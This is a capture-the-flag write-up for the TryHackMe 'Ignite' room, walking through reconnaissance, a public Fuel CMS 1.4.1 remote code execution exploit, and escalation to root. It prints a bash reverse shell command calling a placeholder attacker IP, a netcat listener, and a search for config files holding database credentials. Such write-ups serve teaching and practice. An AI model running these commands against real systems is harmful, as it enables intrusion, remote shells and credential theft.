# 🔥 Ignite - TryHackMe

## 📌 Information

| Field          | Value                                                                 |
| -------------- | --------------------------------------------------------------------- |
| **Machine**    | Ignite                                                                |
| **Platform**   | TryHackMe                                                             |
| **Difficulty** | Easy                                                                  |
| **OS**         | Linux                                                                 |
| **Category**   | Web Exploitation / CMS / Remote Code Execution / Privilege Escalation |

---

# 🎯 Objective

Gain root access to the Linux machine by exploiting a vulnerable Fuel CMS installation and retrieving the flags.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and running services using **Nmap**.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version            |
| ---- | ------- | ------------------ |
| 80   | HTTP    | Apache HTTP Server |

### Notes

* Only the HTTP service was exposed.
* Browsing the website revealed a **Fuel CMS** installation.
* The homepage displayed the CMS version.

---

# 🔍 Enumeration

After identifying the CMS, I searched for known vulnerabilities.

```bash
searchsploit fuel cms
```

The results revealed:

```text
Fuel CMS 1.4.1 - Remote Code Execution
```

This version is vulnerable to **unauthenticated remote code execution**.

---

# 💥 Exploitation

A public exploit was available in Exploit-DB.

Copy the exploit locally:

```bash
searchsploit -m php/webapps/47138.py
```

Run the exploit:

```bash
python3 47138.py
```

Configure the target IP when prompted.

Once executed, the exploit provided remote command execution.

Example:

```text
cmd:id
```

Output:

```text
uid=33(www-data) gid=33(www-data)
```

To obtain a reverse shell, start a Netcat listener:

```bash
nc -lvnp 4444
```

Execute a Bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

### Result

A reverse shell was obtained as the **www-data** user.

---

# ⬆️ Privilege Escalation

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Search for configuration files containing credentials.

```bash
find / -name database.php 2>/dev/null
```

The Fuel CMS configuration file contained the database credentials.

Example:

```php
$db['default']['username'] = "root";
$db['default']['password'] = "<password>";
```

Switch to the root user:

```bash
su root
```

Enter the recovered password.

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

---

# 🚩 Flags

## User Flag

```text
<user_flag>
```

## Root Flag

```text
<root_flag>
```

---

# 📚 What I Learned

* Identifying CMS technologies.
* Enumerating software versions.
* Searching Exploit-DB for public vulnerabilities.
* Exploiting Fuel CMS Remote Code Execution.
* Obtaining reverse shells.
* Searching configuration files for credentials.
* Linux privilege escalation using exposed passwords.

---

# 🛠️ Tools Used

* Nmap
* Searchsploit
* Python
* Netcat
* Bash
* Linux CLI

---

# 📖 MITRE ATT&CK

| Technique | Description                       |
| --------- | --------------------------------- |
| T1046     | Network Service Discovery         |
| T1190     | Exploit Public-Facing Application |
| T1505.003 | Web Shell                         |
| T1059.004 | Unix Shell                        |
| T1552.001 | Credentials in Files              |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* Fuel CMS homepage
* Searchsploit results
* Exploit execution
* Remote command execution
* Reverse shell
* Configuration file with credentials
* Root shell
* Flags

---

# ✅ Summary

Ignite is an excellent beginner-friendly Linux machine that introduces web application exploitation through **Fuel CMS 1.4.1**. The room demonstrates how to identify outdated software, leverage a public remote code execution exploit, gain an initial shell, locate sensitive credentials stored in configuration files, and escalate privileges to **root**. It provides valuable hands-on experience with CMS exploitation and Linux post-exploitation techniques.
